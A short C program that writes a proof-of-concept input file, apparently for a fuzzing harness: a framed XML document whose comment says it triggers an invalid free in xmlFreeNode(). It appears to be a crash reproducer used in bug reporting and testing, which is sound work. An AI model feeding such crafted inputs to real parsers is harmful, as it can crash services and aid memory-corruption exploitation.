#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* XML payload that triggers bad_free in xmlFreeNode() */
    const char *xml = "<root xmlns:n=\"http://example.com/ns\">"
                      "<n:child xmlns:n=\"http://example.com/ns2\">"
                      "<n:grandchild xmlns:n=\"http://example.com/ns\"/>"
                      "</n:child>"
                      "</root>";
    size_t xml_len = strlen(xml);

    /* ByteStream framing with correct 4-byte int32 fields:
     * - 4 bytes: options (0)
     * - 4 bytes: encoding length (0)
     * - 4 bytes: XML payload length
     * - XML payload bytes
     */
    int32_t options = 0;
    int32_t enc_len = 0;
    int32_t payload_len = (int32_t)xml_len;

    fwrite(&options, sizeof(options), 1, f);
    fwrite(&enc_len, sizeof(enc_len), 1, f);
    fwrite(&payload_len, sizeof(payload_len), 1, f);
    fwrite(xml, 1, xml_len, f);

    fclose(f);
    return 0;
}